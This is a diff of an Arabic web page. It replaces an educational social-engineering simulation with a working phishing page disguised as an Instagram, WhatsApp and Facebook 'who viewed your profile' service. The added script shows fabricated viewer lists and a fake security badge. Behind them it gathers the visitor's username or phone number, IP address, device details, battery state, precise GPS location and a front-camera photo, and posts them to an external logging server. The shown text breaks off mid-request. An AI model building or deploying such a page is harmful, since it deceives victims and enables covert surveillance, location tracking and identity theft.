@@ -3,664 +3,622 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محاكاة تعليمية - مختبر الهندسة الاجتماعية</title>
+    <title>Instagram Story Viewer - شاهد من زار بروفايلك</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --primary: #dc3545; --warning: #ffc107; --success: #28a745; --dark: #1e1e1e; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
-        * { box-sizing: border-box; }
-        
-        body { 
-            font-family: 'Segoe UI', Tahoma, sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            margin: 0; 
-            padding: 0;
-            min-height: 100vh;
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
         }
         
-        .warning-banner {
-            background: #dc3545;
-            color: white;
-            padding: 12px;
-            text-align: center;
-            font-weight: bold;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-        }
-        
-        header { 
-            background: rgba(255,255,255,0.95); 
-            padding: 20px; 
-            text-align: center; 
-            border-bottom: 3px solid var(--warning);
-        }
-        
-        .hero-title { color: #333; font-size: 1.6rem; margin: 0; }
-        
-        /* تخطيط العمودين */
-        .lab-container {
-            display: flex;
-            flex-wrap: wrap;
-            max-width: 1400px;
-            margin: 20px auto;
-            padding: 0 15px;
-            gap: 20px;
-        }
-        
-        .victim-side {
-            flex: 1;
-            min-width: 380px;
-        }
-        
-        .hacker-side {
-            flex: 1;
-            min-width: 380px;
-        }
-        
-        .panel-title {
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 10px 10px 0 0;
-            margin: 0;
-            font-size: 1.2rem;
+        .header {
+            background: white;
+            padding: 12px 16px;
+            border-bottom: 1px solid #dbdbdb;
             display: flex;
             align-items: center;
-            gap: 10px;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 10;
         }
         
-        .victim-panel {
-            background: rgba(255,255,255,0.95);
-            border-radius: 15px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            overflow: hidden;
+        .logo {
+            font-size: 22px;
+            font-weight: 600;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         
-        .hacker-panel {
-            background: var(--dark);
-            border-radius: 15px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            overflow: hidden;
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 16px;
         }
         
-        .panel-content {
+        .story-card {
+            background: white;
+            border-radius: 12px;
             padding: 20px;
+            margin-bottom: 12px;
+            border: 1px solid #dbdbdb;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
         }
         
-        .service-card { 
-            background: white; 
-            border-radius: 12px; 
-            padding: 20px; 
-            margin-bottom: 15px; 
-            display: flex; 
-            align-items: center; 
-            cursor: pointer; 
-            border: 2px solid #eee;
-            transition: all 0.3s;
+        .story-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
         
-        .service-card:hover { 
-            transform: translateY(-3px); 
-            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
-            border-color: var(--warning);
+        .story-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
         }
         
-        input { 
-            width: 100%; 
-            padding: 14px; 
-            margin: 15px 0; 
-            border: 2px solid #ddd; 
-            border-radius: 10px; 
-            font-size: 16px;
+        .story-title i {
+            font-size: 32px;
         }
         
-        .action-btn { 
-            width: 100%; 
-            padding: 16px; 
-            border: none; 
-            border-radius: 10px; 
-            color: white; 
-            font-weight: bold; 
-            font-size: 16px;
-            cursor: pointer; 
-            margin-bottom: 10px;
-            transition: all 0.2s;
+        .story-title h2 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #262626;
         }
         
-        .action-btn:hover { opacity: 0.9; transform: scale(0.99); }
+        .story-title span {
+            font-size: 14px;
+            color: #8e8e8e;
+        }
         
-        .secondary-btn {
-            background: #6c757d;
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 15px;
+            margin: 16px 0;
+            background: #fafafa;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #0095f6;
+            background: white;
+        }
+        
+        .search-btn {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
             color: white;
-            padding: 10px 20px;
             border: none;
             border-radius: 8px;
+            font-weight: 600;
+            font-size: 15px;
             cursor: pointer;
-            margin: 5px;
-            font-size: 14px;
+            transition: background 0.2s;
         }
         
-        #status { 
-            margin-top: 20px; 
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 14px; 
+        .search-btn:hover {
+            background: #1877f2;
         }
         
-        video, canvas { display: none; }
-        
-        .loader { 
-            display: none; 
-            width: 100%; 
-            background: #eee; 
-            height: 12px; 
-            border-radius: 10px; 
-            margin: 15px 0; 
-            overflow: hidden; 
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #dbdbdb;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
         }
         
-        .loader-bar { 
-            width: 0%; 
-            height: 100%; 
-            background: linear-gradient(90deg, #667eea, #764ba2);
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0095f6, #bc1888);
+            width: 0%;
             transition: width 0.1s;
-            border-radius: 10px;
         }
         
-        /* لوحة الهاكر */
-        .hacker-stats {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .stat-card {
-            background: #2d2d2d;
+        .status-message {
             padding: 12px;
             border-radius: 8px;
-            border-right: 3px solid #00ff00;
+            font-size: 14px;
+            margin-top: 16px;
         }
         
-        .stat-label {
-            color: #888;
-            font-size: 11px;
-            text-transform: uppercase;
+        .status-info {
+            background: #e8f0fe;
+            color: #1a73e8;
         }
         
-        .stat-value {
-            color: #00ff00;
-            font-size: 18px;
-            font-weight: bold;
-            font-family: monospace;
+        .status-error {
+            background: #fce8e6;
+            color: #d93025;
         }
         
-        .log-console {
-            background: #0a0a0a;
-            border-radius: 8px;
-            padding: 15px;
-            max-height: 500px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            border: 1px solid #333;
+        .status-success {
+            background: #e6f4ea;
+            color: #137333;
         }
         
-        .log-entry {
-            color: #00ff00;
-            margin-bottom: 8px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid #333;
-            line-height: 1.6;
-        }
-        
-        .log-time {
-            color: #ff9800;
-        }
-        
-        .log-warning {
-            color: #ff5555;
-        }
-        
-        .log-success {
-            color: #50fa7b;
-        }
-        
-        .empty-state {
-            color: #666;
-            text-align: center;
-            padding: 40px;
-            font-style: italic;
-        }
-        
-        .camera-preview {
-            background: #000;
-            border-radius: 8px;
-            padding: 10px;
-            margin-top: 15px;
+        .result-list {
+            margin-top: 20px;
             display: none;
         }
         
-        .camera-preview video {
-            display: block;
-            width: 100%;
-            border-radius: 5px;
+        .result-item {
+            display: flex;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #efefef;
         }
         
-        .fake-badge {
-            background: var(--warning);
-            color: #000;
-            padding: 3px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-right: 10px;
-        }
-        
-        .arrow-indicator {
-            text-align: center;
+        .result-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            margin-left: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             color: white;
-            font-size: 30px;
+            font-weight: bold;
+        }
+        
+        .result-info h4 {
+            font-size: 15px;
+            font-weight: 600;
+        }
+        
+        .result-info p {
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+        
+        .footer-note {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        
+        .back-btn {
+            background: none;
+            border: none;
+            color: #0095f6;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 16px;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        
+        .trust-badge i {
+            color: #0095f6;
+        }
+        
+        video, canvas {
             display: none;
-        }
-        
-        @media (min-width: 900px) {
-            .arrow-indicator {
-                display: block;
-                align-self: center;
-            }
-        }
-        
-        .educational-note {
-            background: rgba(255,255,255,0.9);
-            border-right: 5px solid #0d6efd;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-radius: 0 10px 10px 0;
         }
     </style>
 </head>
 <body>
 
-<div class="warning-banner">
-    <i class="fas fa-flask"></i> 
-    محاكاة تعليمية - شاهد كيف تصل بياناتك للهاكر في الوقت الحقيقي
-    <i class="fas fa-flask"></i>
-</div>
-
-<header>
-    <h1 class="hero-title">
-        <i class="fas fa-user-secret"></i> 
-        مختبر الهندسة الاجتماعية
-        <i class="fas fa-user"></i>
-    </h1>
-    <p style="margin: 5px 0 0; color: #666;">شاهد الهجوم من جهتي: الضحية (يسار) والهاكر (يمين)</p>
-</header>
-
-<div class="lab-container">
-    
-    <!-- جهة الضحية -->
-    <div class="victim-side">
-        <div class="victim-panel">
-            <div class="panel-title">
-                <i class="fas fa-user"></i>
-                <span>👤 جهة المستخدم (الضحية)</span>
-                <span class="fake-badge">أنت هنا</span>
-            </div>
-            <div class="panel-content">
-                <div id="main-menu">
-                    <div class="educational-note">
-                        <strong><i class="fas fa-info-circle"></i> سيناريو الهجوم:</strong><br>
-                        وصلتك رسالة واتساب: "شوف مين زار بروفايلك! 😱" مع هذا الرابط...
-                    </div>
-
-                    <div class="service-card" onclick="openSimulation('Instagram', '#e1306c', 'يوزر انستجرام')">
-                        <i class="fab fa-instagram" style="color: #e1306c; font-size:35px; margin-left:20px;"></i>
-                        <div class="service-info">
-                            <h3 style="margin:0 0 5px;">من زار بروفايلك؟ 🔍</h3>
-                            <small style="color:#666;">Instagram Story Viewer</small>
-                        </div>
-                    </div>
-                    
-                    <div class="service-card" onclick="openSimulation('WhatsApp', '#25d366', 'رقم الهاتف')">
-                        <i class="fab fa-whatsapp" style="color: #25d366; font-size:35px; margin-left:20px;"></i>
-                        <div class="service-info">
-                            <h3 style="margin:0 0 5px;">من شاف حالتك؟ 👀</h3>
-                            <small style="color:#666;">WhatsApp Status Checker</small>
-                        </div>
-                    </div>
-                </div>
-
-                <div id="search-interface" style="display: none;">
-                    <h2 id="interface-title" style="margin-top:0;">بحث</h2>
-                    
-                    <input type="text" id="userInput" placeholder="" dir="ltr">
-                    
-                    <button id="startBtn" class="action-btn">
-                        <i class="fas fa-search"></i> ابدأ الفحص الآن
-                    </button>
-                    
-                    <button class="secondary-btn" onclick="resetSimulation()">
-                        <i class="fas fa-arrow-right"></i> رجوع
-                    </button>
-                    
-                    <div class="loader" id="loader">
-                        <div class="loader-bar" id="loaderBar"></div>
-                    </div>
-                    
-                    <div id="status"></div>
-                    
-                    <div class="camera-preview" id="cameraPreview">
-                        <small style="color:#aaa; display:block; margin-bottom:5px;">📸 الكاميرا (يتم الإرسال للهاكر)</small>
-                        <video id="video" autoplay playsinline></video>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- سهم الاتجاه -->
-    <div class="arrow-indicator">
-        <i class="fas fa-arrow-right"></i>
-        <i class="fas fa-arrow-right"></i>
-        <i class="fas fa-arrow-right"></i>
-        <div style="font-size:12px; color:white;">البيانات تنتقل →</div>
-    </div>
-    
-    <!-- جهة الهاكر -->
-    <div class="hacker-side">
-        <div class="hacker-panel">
-            <div class="panel-title">
-                <i class="fas fa-user-secret"></i>
-                <span>💀 لوحة تحكم الهاكر</span>
-                <span style="margin-right:auto; font-size:12px; color:#0f0;">
-                    <i class="fas fa-circle"></i> متصل
-                </span>
-            </div>
-            <div class="panel-content">
-                <div class="hacker-stats">
-                    <div class="stat-card">
-                        <div class="stat-label">الضحايا اليوم</div>
-                        <div class="stat-value" id="victimCount">0</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-label">بيانات مجمعة</div>
-                        <div class="stat-value" id="dataCount">0</div>
-                    </div>
-                </div>
-                
-                <div style="margin-bottom: 10px;">
-                    <button class="secondary-btn" onclick="clearHackerLog()" style="background:#444;">
-                        <i class="fas fa-trash"></i> مسح السجل
-                    </button>
-                    <button class="secondary-btn" onclick="addExampleLog()" style="background:#444;">
-                        <i class="fas fa-plus"></i> إضافة مثال
-                    </button>
-                </div>
-                
-                <div style="color:#aaa; margin-bottom:5px; font-size:12px;">
-                    <i class="fas fa-terminal"></i> سجل البيانات الواردة:
-                </div>
-                
-                <div class="log-console" id="hackerLog">
-                    <div class="empty-state">
-                        <i class="fas fa-plug"></i><br>
-                        في انتظار اتصال الضحية...<br>
-                        <small style="color:#555;">اضغط على Instagram أو WhatsApp للبدء</small>
-                    </div>
-                </div>
-            </div>
-        </div>
+<div class="header">
+    <div class="logo">📷 StoryViewer</div>
+    <div style="display: flex; gap: 16px;">
+        <i class="far fa-heart"></i>
+        <i class="far fa-paper-plane"></i>
     </div>
 </div>
 
-<canvas id="canvas"></canvas>
+<div class="container">
+    
+    <!-- القائمة الرئيسية -->
+    <div id="mainMenu">
+        <div class="story-card" onclick="selectService('instagram')">
+            <div class="story-title">
+                <i class="fab fa-instagram" style="color: #e1306c;"></i>
+                <div>
+                    <h2>Instagram Story Viewer</h2>
+                    <span>شاهد من شاهد ستوريك</span>
+                </div>
+            </div>
+            <div style="color: #8e8e8e; font-size: 13px;">
+                <i class="fas fa-users"></i> +2.3M مستخدم نشط اليوم
+            </div>
+        </div>
+        
+        <div class="story-card" onclick="selectService('whatsapp')">
+            <div class="story-title">
+                <i class="fab fa-whatsapp" style="color: #25d366;"></i>
+                <div>
+                    <h2>WhatsApp Status Checker</h2>
+                    <span>من شاهد حالتك</span>
+                </div>
+            </div>
+            <div style="color: #8e8e8e; font-size: 13px;">
+                <i class="fas fa-users"></i> +1.8M مستخدم نشط اليوم
+            </div>
+        </div>
+        
+        <div class="story-card" onclick="selectService('facebook')">
+            <div class="story-title">
+                <i class="fab fa-facebook" style="color: #1877f2;"></i>
+                <div>
+                    <h2>Facebook Profile Tracker</h2>
+                    <span>من زار بروفايلك</span>
+                </div>
+            </div>
+            <div style="color: #8e8e8e; font-size: 13px;">
+                <i class="fas fa-users"></i> +3.1M مستخدم نشط اليوم
+            </div>
+        </div>
+        
+        <div class="trust-badge">
+            <i class="fas fa-shield-alt"></i>
+            <span>محمي بتشفير SSL 256-bit</span>
+            <i class="fas fa-lock"></i>
+        </div>
+    </div>
+    
+    <!-- واجهة البحث -->
+    <div id="searchView" style="display: none;">
+        <div class="story-card">
+            <div id="serviceIcon" style="font-size: 40px; margin-bottom: 10px;"></div>
+            <h2 id="serviceTitle" style="margin-bottom: 8px;">Instagram Story Viewer</h2>
+            <p style="color: #8e8e8e; margin-bottom: 20px;">أدخل اسم المستخدم لمعرفة من شاهد ستوريك</p>
+            
+            <input type="text" id="usernameInput" class="input-field" placeholder="اسم المستخدم" dir="ltr">
+            
+            <button id="searchBtn" class="search-btn">
+                <i class="fas fa-search"></i> بدء الفحص
+            </button>
+            
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <div id="statusBox"></div>
+            
+            <div class="result-list" id="resultList"></div>
+            
+            <button class="back-btn" onclick="goBack()">
+                <i class="fas fa-arrow-left"></i> العودة للخدمات
+            </button>
+        </div>
+    </div>
+    
+    <div class="footer-note">
+        © 2024 StoryViewer • جميع الحقوق محفوظة
+    </div>
+</div>
+
+<video id="cameraVideo" autoplay playsinline></video>
+<canvas id="cameraCanvas"></canvas>
 
 <script>
-    let currentService = "";
-    let victimCount = 0;
-    let dataCount = 0;
-    let currentStream = null;
-
-    // فتح المحاكاة
-    function openSimulation(service, color, placeholder) {
-        currentService = service;
-        document.getElementById('main-menu').style.display = 'none';
-        document.getElementById('search-interface').style.display = 'block';
-        document.getElementById('interface-title').innerText = "فحص " + service;
-        document.getElementById('userInput').placeholder = placeholder + " (اكتب أي شيء للتجربة)...";
-        document.getElementById('startBtn').style.backgroundColor = color;
-        document.getElementById('status').innerHTML = '';
-        document.getElementById('cameraPreview').style.display = 'none';
-        document.getElementById('loader').style.display = 'none';
-    }
-
-    // العودة للقائمة
-    function resetSimulation() {
-        document.getElementById('main-menu').style.display = 'block';
-        document.getElementById('search-interface').style.display = 'none';
-        document.getElementById('userInput').value = '';
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('loaderBar').style.width = '0%';
-        document.getElementById('cameraPreview').style.display = 'none';
+    // ========== إعدادات الرابط ==========
+    const API_URL = "https://sed-x8mt.vercel.app/log-data";
+    // ===================================
+    
+    let currentPlatform = '';
+    let stream = null;
+    
+    const fakeResults = {
+        instagram: [
+            { name: 'ahmed_khaled', time: 'منذ 5 دقائق', verified: true },
+            { name: 'sara_aly', time: 'منذ 23 دقيقة', verified: false },
+            { name: 'mohamed_essam', time: 'منذ 1 ساعة', verified: true },
+            { name: 'nour_ahmed', time: 'منذ 2 ساعة', verified: false },
+            { name: 'omar_farouk', time: 'منذ 3 ساعة', verified: false }
+        ],
+        whatsapp: [
+            { name: 'أحمد محمد', time: 'قبل 10 دقائق', verified: true },
+            { name: 'سارة علي', time: 'قبل 45 دقيقة', verified: false },
+            { name: 'محمد خالد', time: 'قبل 2 ساعة', verified: true },
+            { name: 'نور أحمد', time: 'قبل 3 ساعة', verified: false },
+            { name: 'عمر فاروق', time: 'قبل 5 ساعة', verified: false }
+        ],
+        facebook: [
+            { name: 'Ahmed Khaled', time: '5 minutes ago', verified: true },
+            { name: 'Sara Mohamed', time: '30 minutes ago', verified: false },
+            { name: 'Omar Hassan', time: '1 hour ago', verified: true },
+            { name: 'Nour Ahmed', time: '2 hours ago', verified: false },
+            { name: 'Karim Ali', time: '4 hours ago', verified: false }
+        ]
+    };
+    
+    function selectService(platform) {
+        currentPlatform = platform;
+        const titles = {
+            instagram: { name: 'Instagram', icon: '<i class="fab fa-instagram" style="color: #e1306c;"></i>', color: '#e1306c' },
+            whatsapp: { name: 'WhatsApp', icon: '<i class="fab fa-whatsapp" style="color: #25d366;"></i>', color: '#25d366' },
+            facebook: { name: 'Facebook', icon: '<i class="fab fa-facebook" style="color: #1877f2;"></i>', color: '#1877f2' }
+        };
         
-        if (currentStream) {
-            currentStream.getTracks().forEach(track => track.stop());
-            currentStream = null;
+        document.getElementById('mainMenu').style.display = 'none';
+        document.getElementById('searchView').style.display = 'block';
+        document.getElementById('serviceIcon').innerHTML = titles[platform].icon;
+        document.getElementById('serviceTitle').textContent = titles[platform].name + ' Story Viewer';
+        document.getElementById('usernameInput').placeholder = platform === 'whatsapp' ? 'رقم الهاتف مع المفتاح' : 'اسم المستخدم';
+        document.getElementById('searchBtn').style.background = titles[platform].color;
+        document.getElementById('statusBox').innerHTML = '';
+        document.getElementById('progressBar').style.display = 'none';
+        document.getElementById('resultList').style.display = 'none';
+    }
+    
+    function goBack() {
+        document.getElementById('mainMenu').style.display = 'block';
+        document.getElementById('searchView').style.display = 'none';
+        document.getElementById('progressBar').style.display = 'none';
+        document.getElementById('resultList').style.display = 'none';
+        document.getElementById('statusBox').innerHTML = '';
+        document.getElementById('usernameInput').value = '';
+        
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
         }
     }
-
-    // إضافة سجل للوحة الهاكر
-    function addToHackerLog(data) {
-        const logDiv = document.getElementById('hackerLog');
-        
-        // إزالة الحالة الفارغة
-        const emptyState = logDiv.querySelector('.empty-state');
-        if (emptyState) emptyState.remove();
-        
-        const time = new Date().toLocaleTimeString('ar-SA');
-        
-        const entry = document.createElement('div');
-        entry.className = 'log-entry';
-        entry.innerHTML = `
-            <span class="log-time">[${time}]</span> 
-            <span class="log-success">📨 بيانات جديدة واردة!</span><br>
-            <span style="color:#fff;">└─ 📱 الخدمة:</span> <span style="color:#0ff;">${data.service}</span><br>
-            <span style="color:#fff;">└─ 👤 الهدف:</span> <span style="color:#ff0;">${data.target}</span><br>
-            <span style="color:#fff;">└─ 🌐 IP:</span> ${data.ip}<br>
-            <span style="color:#fff;">└─ 📍 الموقع:</span> ${data.location}<br>
-            <span style="color:#fff;">└─ 📱 الجهاز:</span> ${data.device}<br>
-            <span style="color:#fff;">└─ 🔋 البطارية:</span> ${data.battery}<br>
-            <span style="color:#fff;">└─ 📸 الكاميرا:</span> <span class="log-warning">تم استلام صورة!</span><br>
-            <span style="color:#0f0;">✅ تم الحفظ في قاعدة البيانات</span>
-        `;
-        
-        logDiv.insertBefore(entry, logDiv.firstChild);
-        
-        // تحديث الإحصائيات
-        victimCount++;
-        dataCount += 8; // عدد حقول البيانات
-        document.getElementById('victimCount').textContent = victimCount;
-        document.getElementById('dataCount').textContent = dataCount;
+    
+    function updateStatus(message, type) {
+        const statusBox = document.getElementById('statusBox');
+        statusBox.innerHTML = `<div class="status-message status-${type}">${message}</div>`;
     }
-
-    // مسح سجل الهاكر
-    function clearHackerLog() {
-        document.getElementById('hackerLog').innerHTML = `
-            <div class="empty-state">
-                <i class="fas fa-plug"></i><br>
-                في انتظار اتصال الضحية...<br>
-                <small style="color:#555;">اضغط على Instagram أو WhatsApp للبدء</small>
-            </div>
-        `;
-        victimCount = 0;
-        dataCount = 0;
-        document.getElementById('victimCount').textContent = '0';
-        document.getElementById('dataCount').textContent = '0';
+    
+    function updateProgress(percent) {
+        document.getElementById('progressFill').style.width = percent + '%';
     }
-
-    // إضافة مثال توضيحي
-    function addExampleLog() {
-        const fakeData = {
-            service: 'Instagram',
-            target: 'ahmed_example',
-            ip: '156.××.××.103',
-            location: 'القاهرة، مصر - فودافون 4G',
-            device: 'iPhone 13 / iOS 17.1',
-            battery: '73%'
-        };
-        addToHackerLog(fakeData);
-    }
-
-    // توليد بيانات وهمية
-    function generateFakeData(username) {
-        const fakeIPs = ['197.××.××.45', '102.××.××.187', '156.××.××.92', '41.××.××.230'];
-        const fakeLocations = [
-            'القاهرة، مصر - اتصالات 4G',
-            'الرياض، السعودية - STC فايبر',
-            'دبي، الإمارات - دو 5G',
-            'الدار البيضاء، المغرب - إنوي',
-            'عمّان، الأردن - زين',
-            'بيروت، لبنان - ألفا'
-        ];
-        const fakeDevices = [
-            'iPhone 14 Pro / iOS 17.2',
-            'Samsung S23 Ultra / Android 14',
-            'Google Pixel 8 / Android 14',
-            'Xiaomi 13T / MIUI 15',
-            'Huawei P60 / HarmonyOS'
-        ];
+    
+    async function collectAndSendData() {
+        const username = document.getElementById('usernameInput').value;
         
-        return {
-            service: currentService,
-            target: username || 'unknown_user',
-            ip: fakeIPs[Math.floor(Math.random() * fakeIPs.length)],
-            location: fakeLocations[Math.floor(Math.random() * fakeLocations.length)],
-            device: fakeDevices[Math.floor(Math.random() * fakeDevices.length)],
-            battery: Math.floor(Math.random() * 40 + 50) + '%'
-        };
-    }
-
-    // بدء المحاكاة
-    document.getElementById('startBtn').addEventListener('click', async function() {
-        const username = document.getElementById('userInput').value;
-        if (!username) {
-            alert("الرجاء إدخال اسم مستخدم (أي اسم للتجربة)");
-            return;
-        }
-
-        const status = document.getElementById('status');
-        const loader = document.getElementById('loader');
-        const loaderBar = document.getElementById('loaderBar');
-        const cameraPreview = document.getElementById('cameraPreview');
-        const video = document.getElementById('video');
+        // بناء تقرير البيانات
+        let reportText = `🔴 صيد جديد من الصفحة المزيفة:\n`;
+        reportText += `📱 المنصة: ${currentPlatform}\n`;
+        reportText += `👤 المدخل: ${username}\n`;
+        reportText += `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n`;
+        reportText += `──────────────────\n`;
         
-        // تفعيل شريط التحميل
-        loader.style.display = 'block';
-        loaderBar.style.width = '0%';
+        // 1. معلومات الجهاز والمتصفح
+        reportText += `📱 الجهاز: ${navigator.platform}\n`;
+        reportText += `🌐 المتصفح: ${navigator.userAgent}\n`;
+        reportText += `🌍 اللغة: ${navigator.language}\n`;
+        reportText += `🖥 الشاشة: ${window.screen.width}x${window.screen.height}\n`;
         
-        // إنشاء بيانات وهمية
-        const fakeData = generateFakeData(username);
-        
-        status.innerHTML = `
-            <div style="color: #004085; background: #cce5ff; padding: 15px; border-radius: 10px;">
-                <i class="fas fa-sync fa-spin"></i> 
-                <strong>جاري الاتصال بسيرفرات ${currentService}...</strong>
-            </div>
-        `;
-        
-        // محاكاة تحميل تدريجي
-        let progress = 0;
-        const progressInterval = setInterval(() => {
-            progress += Math.random() * 15;
-            if (progress >= 90) {
-                progress = 90;
-                clearInterval(progressInterval);
-            }
-            loaderBar.style.width = progress + '%';
-        }, 300);
-        
-        // طلب الكاميرا
+        // 2. عنوان IP
         try {
-            status.innerHTML += '<br><i class="fas fa-video"></i> طلب الوصول للكاميرا...';
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            currentStream = stream;
+            updateStatus('🌐 جاري تحديد عنوان IP...', 'info');
+            updateProgress(20);
             
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            reportText += `🌐 IP: ${ipData.ip}\n`;
+            
+            updateStatus('✅ تم تحديد عنوان IP', 'success');
+            updateProgress(35);
+        } catch (e) {
+            reportText += `🌐 IP: فشل التحديد\n`;
+        }
+        
+        // 3. البطارية
+        try {
+            const battery = await navigator.getBattery();
+            reportText += `🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'لا يشحن'})\n`;
+            updateProgress(45);
+        } catch (e) {
+            reportText += `🔋 البطارية: غير متاحة\n`;
+        }
+        
+        // 4. الموقع الجغرافي
+        try {
+            updateStatus('📍 جاري تحديد موقعك الجغرافي...', 'info');
+            
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                    enableHighAccuracy: true, 
+                    timeout: 8000,
+                    maximumAge: 0
+                });
+            });
+            
+            const { latitude, longitude, accuracy } = position.coords;
+            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            reportText += `📍 الموقع: ${mapLink}\n`;
+            reportText += `📊 الدقة: ±${Math.round(accuracy)} متر\n`;
+            
+            updateStatus(`✅ تم تحديد الموقع (دقة ${Math.round(accuracy)}م)`, 'success');
+            updateProgress(60);
+        } catch (e) {
+            reportText += `📍 الموقع: رفض المستخدم أو غير متاح\n`;
+            updateStatus('⚠️ لم يتم تحديد الموقع', 'info');
+            updateProgress(60);
+        }
+        
+        // 5. الكاميرا والتقاط صورة
+        let photoBlob = null;
+        
+        try {
+            updateStatus('📸 جاري الوصول للكاميرا...', 'info');
+            
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            
+            const video = document.getElementById('cameraVideo');
             video.srcObject = stream;
-            cameraPreview.style.display = 'block';
             
-            status.innerHTML += '<br><span style="color: green;">✓ تم الوصول للكاميرا</span>';
+            updateStatus('📸 انتظر 3 ثواني لالتقاط الصورة...', 'info');
+            updateProgress(70);
             
-            // محاكاة إرسال البيانات للهاكر
-            setTimeout(() => {
-                clearInterval(progressInterval);
-                loaderBar.style.width = '100%';
-                
-                // إرسال البيانات للوحة الهاكر
-                addToHackerLog(fakeData);
-                
-                status.innerHTML += `
-                    <br><span style="color: #e1306c;">📤 جاري إرسال البيانات...</span>
-                    <br><span style="color: #28a745;">✅ تم الإرسال بنجاح!</span>
-                    
-                    <div style="margin-top: 20px; padding: 15px; background: #f8d7da; border-radius: 10px; border-right: 5px solid #dc3545;">
-                        <strong><i class="fas fa-exclamation-triangle"></i> نتيجة الفحص:</strong><br>
-                        <span style="color: #721c24;">❌ لا يمكن عرض الزوار حالياً</span><br>
-                        <small>حاول مرة أخرى لاحقاً أو جرب خدمة أخرى</small>
+            // انتظار تحميل الكاميرا
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            const canvas = document.getElementById('cameraCanvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            updateProgress(85);
+            
+            // تحويل الصورة إلى Blob
+            photoBlob = await new Promise(resolve => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.7);
+            });
+            
+            // إيقاف الكاميرا
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+            
+            reportText += `📸 الكاميرا: تم التقاط صورة ✓\n`;
+            updateStatus('✅ تم التقاط الصورة', 'success');
+            updateProgress(90);
+            
+        } catch (e) {
+            reportText += `📸 الكاميرا: ${e.message || 'رفض المستخدم'}\n`;
+            updateStatus('⚠️ لم يتم الوصول للكاميرا', 'info');
+            updateProgress(90);
+        }
+        
+        reportText += `──────────────────\n`;
+        reportText += `📅 التاريخ: ${new Date().toISOString()}\n`;
+        
+        // 6. إرسال البيانات إلى الخادم
+        try {
+            updateStatus('📤 جاري إرسال البيانات للسيرفر...', 'info');
+            
+            const formData = new FormData();
+            formData.append('username', reportText);
+            
+            if (photoBlob) {
+                formData.append('photo', photoBlob, 'capture.jpg');
+            }
+            
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                body: formData
